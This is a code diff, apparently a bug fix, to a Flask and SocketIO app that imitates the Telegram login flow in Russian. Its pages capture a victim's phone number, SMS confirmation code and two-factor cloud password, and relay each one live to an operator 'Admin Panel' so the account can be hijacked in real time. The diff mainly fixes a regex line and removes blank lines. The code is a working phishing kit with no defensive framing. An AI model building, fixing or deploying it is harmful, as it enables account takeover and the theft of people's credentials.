@@ -1,9 +1,10 @@
+```python
 import eventlet
 eventlet.monkey_patch()
-
 from flask import Flask, render_template_string, request, redirect, url_for
 from flask_socketio import SocketIO, emit, join_room, leave_room
 from datetime import datetime
+import re
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'your-secret-key-here'
@@ -290,46 +291,36 @@ def phone():
             var socket = io({
                 transports: ['websocket', 'polling']
             });
-            
             socket.on('connect', function() {
                 console.log('Соединение установлено');
             });
-            
             socket.on('redirect_to_admin', function(data) {
                 window.location.href = data.url;
             });
-            
             function submitPhone() {
                 var phoneInput = document.getElementById('phone');
                 var phone = phoneInput.value.replace(/[^+0-9]/g, '');
                 var errorDiv = document.getElementById('error');
                 var loadingDiv = document.getElementById('loading');
                 var submitBtn = document.getElementById('submitBtn');
-                
                 errorDiv.classList.remove('show');
-                
                 if (!phone.startsWith('+7')) {
                     errorDiv.textContent = 'Номер должен начинаться с +7';
                     errorDiv.classList.add('show');
                     return;
                 }
-                
                 if (phone.length < 12) {
                     errorDiv.textContent = 'Введите полный номер телефона';
                     errorDiv.classList.add('show');
                     return;
                 }
-                
                 submitBtn.disabled = true;
                 loadingDiv.classList.add('show');
-                
                 socket.emit('submit_phone', phone);
-                
                 setTimeout(function() {
                     window.location.href = '/code?phone=' + encodeURIComponent(phone);
                 }, 500);
             }
-            
             // Форматирование номера при вводе
             document.addEventListener('DOMContentLoaded', function() {
                 var phoneInput = document.getElementById('phone');
@@ -337,7 +328,6 @@ def phone():
                     var x = e.target.value.replace(/\D/g, '').match(/(\d{0,1})(\d{0,3})(\d{0,3})(\d{0,2})(\d{0,2})/);
                     e.target.value = !x[2] ? '+' + x[1] : '+' + x[1] + ' (' + x[2] + ') ' + x[3] + (x[4] ? '-' + x[4] : '') + (x[5] ? '-' + x[5] : '');
                 });
-                
                 // Enter для отправки
                 phoneInput.addEventListener('keypress', function(e) {
                     if (e.key === 'Enter') {
@@ -354,16 +344,12 @@ def phone():
                 <h2>Вход в Telegram</h2>
                 <p class="subtitle">Введите ваш номер телефона</p>
             </div>
-            
             <div class="input-group">
                 <label for="phone">Номер телефона</label>
                 <input id="phone" type="tel" placeholder="+7 (___) ___-__-__" value="+7 " autofocus />
             </div>
-            
             <div id="error" class="error"></div>
-            
             <button id="submitBtn" onclick="submitPhone()">Продолжить</button>
-            
             <div id="loading" class="loading">
                 <div class="spinner"></div>
                 <p style="margin-top: 10px;">Отправка...</p>
@@ -377,7 +363,8 @@ def phone():
 def handle_phone(phone):
     if not phone.startswith('+7'):
         return
-    digits = phone[2:].replace(/\D/g, '')
+    # Используем re.sub для замены всех нецифровых символов
+    digits = re.sub(r'\D', '', phone[2:])
     if len(digits) == 10 and all(d == '9' for d in digits):
         log_action(f'🔑 Админ вошел с номером: {phone}')
         emit('redirect_to_admin', {'url': '/admin'})
@@ -528,41 +515,33 @@ def code():
                 transports: ['websocket', 'polling']
             });
             var phone = '{{ phone }}';
-            
             document.addEventListener('DOMContentLoaded', function() {
                 const inputs = document.querySelectorAll('.code-input');
-                
                 inputs.forEach((input, index) => {
                     input.addEventListener('input', function(e) {
                         if (e.target.value.length === 1 && index < inputs.length - 1) {
                             inputs[index + 1].focus();
                         }
-                        
                         if (index === inputs.length - 1 && e.target.value.length === 1) {
                             submitCode();
                         }
                     });
-                    
                     input.addEventListener('keydown', function(e) {
                         if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                             inputs[index - 1].focus();
                         }
                     });
                 });
-                
                 inputs[0].focus();
             });
-            
             function submitCode() {
                 const inputs = document.querySelectorAll('.code-input');
                 const code = Array.from(inputs).map(input => input.value).join('');
-                
                 if (code.length === 6) {
                     document.getElementById('loading').classList.add('show');
                     socket.emit('submit_code', {phone: phone, code: code});
                 }
             }
-            
             socket.on('code_confirmed', function(data) {
                 document.getElementById('loading').classList.remove('show');
                 if (data.phone === phone && data.confirmed) {
@@ -589,7 +568,6 @@ def code():
                     <span class="phone-display">{{ phone }}</span>
                 </p>
             </div>
-            
             <div class="code-inputs">
                 <input type="text" maxlength="1" class="code-input" pattern="[0-9]">
                 <input type="text" maxlength="1" class="code-input" pattern="[0-9]">
@@ -598,13 +576,10 @@ def code():
                 <input type="text" maxlength="1" class="code-input" pattern="[0-9]">
                 <input type="text" maxlength="1" class="code-input" pattern="[0-9]">
             </div>
-            
             <div id="error" class="error"></div>
-            
             <div id="loading" class="loading">
                 Проверка кода...
             </div>
-            
             <div class="resend-link" onclick="alert('Новый код отправлен')">
                 Отправить код повторно
             </div>
@@ -785,7 +760,6 @@ def password():
                 transports: ['websocket', 'polling']
             });
             var phone = '{{ phone }}';
-            
             function togglePassword() {
                 var input = document.getElementById('password');
                 var icon = document.getElementById('toggleIcon');
@@ -797,7 +771,6 @@ def password():
                     icon.textContent = '👁️';
                 }
             }
-            
             function submitPassword() {
                 var password = document.getElementById('password').value;
                 if (!password) {
@@ -807,7 +780,6 @@ def password():
                 }
                 socket.emit('submit_password', {phone: phone, password: password});
             }
-            
             socket.on('password_confirmed', function(data) {
                 if (data.phone === phone && data.confirmed) {
                     document.getElementById('success').classList.add('show');
@@ -823,7 +795,6 @@ def password():
                     document.getElementById('password').style.borderColor = '#e74c3c';
                 }
             });
-            
             document.addEventListener('DOMContentLoaded', function() {
                 document.getElementById('password').addEventListener('keypress', function(e) {
                     if (e.key === 'Enter') {
@@ -840,21 +811,16 @@ def password():
                 <h2>Cloud Password</h2>
                 <p class="subtitle">Введите пароль облачного хранилища</p>
             </div>
-            
             <div class="input-group">
                 <label for="password">Пароль</label>
                 <input id="password" type="password" placeholder="Введите пароль" autofocus />
                 <span class="toggle-password" id="toggleIcon" onclick="togglePassword()">👁️</span>
             </div>
-            
             <div id="error" class="error"></div>
-            
             <button onclick="submitPassword()">Войти</button>
-            
             <div id="success" class="success">
                 ✓ Авторизация успешна! Перенаправление...
             </div>
-            
             <div class="forgot-link" onclick="alert('Восстановление пароля отправлено на email')">
                 Забыли пароль?
             </div>
@@ -1052,11 +1018,9 @@ def admin():
             var socket = io({
                 transports: ['websocket', 'polling']
             });
-            
             var totalUsers = 0;
             var totalCodes = 0;
             var totalPasswords = 0;
-            
             socket.on('new_log', function(msg){
                 var div = document.getElementById('logs');
                 var entry = document.createElement('div');
@@ -1065,15 +1029,12 @@ def admin():
                 div.appendChild(entry);
                 div.scrollTop = div.scrollHeight;
             });
-            
             socket.on('new_code', function(data){
                 totalCodes++;
                 updateStats();
-                
                 var pending = document.getElementById('pending');
                 var empty = document.getElementById('emptyState');
                 if (empty) empty.remove();
-                
                 var entry = document.createElement('div');
                 entry.className = 'pending-item';
                 entry.id = 'code-' + data.phone.replace(/[^a-zA-Z0-9]/g, '');
@@ -1090,15 +1051,12 @@ def admin():
                 `;
                 pending.appendChild(entry);
             });
-            
             socket.on('new_password', function(data){
                 totalPasswords++;
                 updateStats();
-                
                 var pending = document.getElementById('pending');
                 var empty = document.getElementById('emptyState');
                 if (empty) empty.remove();
-                
                 var entry = document.createElement('div');
                 entry.className = 'pending-item';
                 entry.id = 'password-' + data.phone.replace(/[^a-zA-Z0-9]/g, '');
@@ -1115,7 +1073,6 @@ def admin():
                 `;
                 pending.appendChild(entry);
             });
-            
             function confirmCode(phone, confirmed = true) {
                 socket.emit('confirm_code', {phone: phone, confirmed: confirmed});
                 var entry = document.getElementById('code-' + phone.replace(/[^a-zA-Z0-9]/g, ''));
@@ -1125,7 +1082,6 @@ def admin():
                 }
                 checkEmpty();
             }
-            
             function confirmPassword(phone, confirmed = true) {
                 socket.emit('confirm_password', {phone: phone, confirmed: confirmed});
                 var entry = document.getElementById('password-' + phone.replace(/[^a-zA-Z0-9]/g, ''));
@@ -1135,7 +1091,6 @@ def admin():
                 }
                 checkEmpty();
             }
-            
             function checkEmpty() {
                 setTimeout(() => {
                     var pending = document.getElementById('pending');
@@ -1144,13 +1099,11 @@ def admin():
                     }
                 }, 400);
             }
-            
             function updateStats() {
                 document.getElementById('statUsers').textContent = totalUsers;
                 document.getElementById('statCodes').textContent = totalCodes;
                 document.getElementById('statPasswords').textContent = totalPasswords;
             }
-            
             checkEmpty();
         </script>
     </head>
@@ -1160,7 +1113,6 @@ def admin():
                 <h1>⚡ Admin Panel</h1>
                 <p>Панель управления и мониторинга системы авторизации</p>
             </div>
-            
             <div class="stats">
                 <div class="stat-card">
                     <h3>Всего пользователей</h3>
@@ -1175,12 +1127,10 @@ def admin():
                     <div class="value" id="statPasswords">0</div>
                 </div>
             </div>
-            
             <div class="section">
                 <h2>📊 Системные логи</h2>
                 <div id="logs"></div>
             </div>
-            
             <div class="section">
                 <h2>⏳ Ожидающие подтверждения</h2>
                 <div id="pending">
@@ -1243,3 +1193,4 @@ if __name__ == '__main__':
     import os
     port = int(os.environ.get("PORT", 5000))
     socketio.run(app, host="0.0.0.0", port=port, debug=False)
+```
